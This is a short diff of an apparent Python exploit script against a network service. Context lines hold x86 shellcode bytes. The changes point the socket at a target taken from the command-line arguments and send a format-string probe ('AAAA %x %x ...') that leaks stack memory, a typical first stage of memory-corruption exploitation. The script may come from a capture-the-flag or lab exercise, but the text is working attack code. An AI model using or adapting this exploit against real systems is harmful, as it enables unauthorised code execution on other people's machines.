@@ -82,14 +82,13 @@ sc+="\x6e\x89\xe3\x31\xc9\xcd\x80"
 
 
 s = socket.socket()
-#s.connect((sys.argv[1], int(sys.argv[2])))
-s.connect((127.0.0.1, 4444)))
+s.connect((sys.argv[1], int(sys.argv[2])))
 
 line = readLine(s)
 sys.stdout.write(line)
 
 
-s.send(1/n AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/n )
+s.send("AAAA %x %x %x %x %x %x %x %x %x %x %x %x\n")
 line = readLine(s)
 
 sys.stdout.write(line)
